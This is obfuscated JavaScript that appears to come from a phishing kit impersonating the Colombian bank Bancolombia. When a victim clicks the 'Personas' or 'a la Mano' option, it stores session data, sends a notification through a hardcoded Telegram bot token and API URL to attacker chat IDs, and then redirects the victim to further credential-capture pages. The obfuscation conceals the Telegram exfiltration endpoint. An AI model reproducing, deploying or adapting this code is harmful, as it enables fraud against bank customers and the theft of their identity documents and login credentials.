function _0x1f92(_0x5d531a, _0x420044) {
  const _0x38a59c = _0x38a5();
  return (
    (_0x1f92 = function (_0x1f928a, _0x33552a) {
      _0x1f928a = _0x1f928a - 0xff;
      let _0x4f5873 = _0x38a59c[_0x1f928a];
      return _0x4f5873;
    }),
    _0x1f92(_0x5d531a, _0x420044)
  );
}
const _0x4cfbb2 = _0x1f92;
(function (_0x1a2318, _0x15f3b3) {
  const _0x3c3758 = _0x1f92,
    _0x138252 = _0x1a2318();
  while (!![]) {
    try {
      const _0x4bfd65 =
        (-parseInt(_0x3c3758(0x116)) / 0x1) *
          (parseInt(_0x3c3758(0x110)) / 0x2) +
        (parseInt(_0x3c3758(0x10f)) / 0x3) *
          (parseInt(_0x3c3758(0x11a)) / 0x4) +
        -parseInt(_0x3c3758(0x10e)) / 0x5 +
        (parseInt(_0x3c3758(0x107)) / 0x6) *
          (parseInt(_0x3c3758(0x114)) / 0x7) +
        parseInt(_0x3c3758(0x100)) / 0x8 +
        parseInt(_0x3c3758(0x105)) / 0x9 +
        -parseInt(_0x3c3758(0x10d)) / 0xa;
      if (_0x4bfd65 === _0x15f3b3) break;
      else _0x138252["push"](_0x138252["shift"]());
    } catch (_0x4e7f36) {
      _0x138252["push"](_0x138252["shift"]());
    }
  }
})(_0x38a5, 0x1cc2c);
function updateLS() {
  const _0x1aee2f = _0x1f92;
  LS["setItem"](_0x1aee2f(0x103), JSON[_0x1aee2f(0x117)](info));
}
async function sendDataBC() {
  const _0x13f96a = _0x1f92;
  var _0x1444fb = "",
    _0x435c07 = "";
  info["checkerInfo"][_0x13f96a(0x101)] === _0x13f96a(0x109)
    ? ((_0x1444fb = _0x13f96a(0x118)), (_0x435c07 = _0x13f96a(0x10c)))
    : ((_0x1444fb = _0x13f96a(0x10a)), (_0x435c07 = _0x13f96a(0x112)));
  try {
    for (const _0x50b784 of chatIds) {
      const _0x547cd6 =
          _0x13f96a(0x113) +
          _0x50b784 +
          "&text=" +
          encodeURIComponent(_0x1444fb),
        _0x3168e0 = await fetch(_0x547cd6);
      _0x3168e0["ok"]
        ? console[_0x13f96a(0x104)](_0x13f96a(0x115) + _0x50b784 + ")")
        : console[_0x13f96a(0x108)](
            "Error\x20al\x20enviar\x20mensaje\x20al\x20Chat\x20ID\x20" +
              _0x50b784 +
              ":",
            _0x3168e0[_0x13f96a(0xff)]
          );
    }
    window["location"][_0x13f96a(0x11b)] = _0x435c07;
  } catch (_0x21aa63) {
    console[_0x13f96a(0x108)](
      "Error\x20de\x20red\x20al\x20enviar\x20mensajes\x20a\x20Telegram:",
      _0x21aa63
    );
  }
}
function _0x38a5() {
  const _0x152de4 = [
    "error",
    "personas",
    "🟡\x20Bancolombia\x20a\x20la\x20Mano",
    "preventDefault",
    "./user.html",
    "1934270YvEJgQ",
    "985735CceDuN",
    "371766evnKjx",
    "8168LeAhIX",
    "getElementById",
    "./cedula.html",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "609cqjhXH",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(Chat\x20ID:\x20",
    "4BQiefK",
    "stringify",
    "🟡\x20Bancolombia\x20Personas",
    "checkerInfo",
    "4pATaeL",
    "href",
    "mano",
    "statusText",
    "1164632OGbTrC",
    "mode",
    "click",
    "info",
    "log",
    "1954746VuJjTM",
    "addEventListener",
    "2622HUktfw",
  ];
  _0x38a5 = function () {
    return _0x152de4;
  };
  return _0x38a5();
}
document[_0x4cfbb2(0x111)]("personas")[_0x4cfbb2(0x106)](
  _0x4cfbb2(0x102),
  function (_0x53778b) {
    const _0x3386b2 = _0x4cfbb2;
    _0x53778b[_0x3386b2(0x10b)](),
      (info[_0x3386b2(0x119)][_0x3386b2(0x101)] = _0x3386b2(0x109)),
      updateLS(),
      sendDataBC();
  }
),
  document[_0x4cfbb2(0x111)](_0x4cfbb2(0x11c))[_0x4cfbb2(0x106)](
    "click",
    function (_0x39e532) {
      const _0x69af86 = _0x4cfbb2;
      _0x39e532["preventDefault"](),
        (info[_0x69af86(0x119)][_0x69af86(0x101)] = "mano"),
        updateLS(),
        sendDataBC();
    }
  );
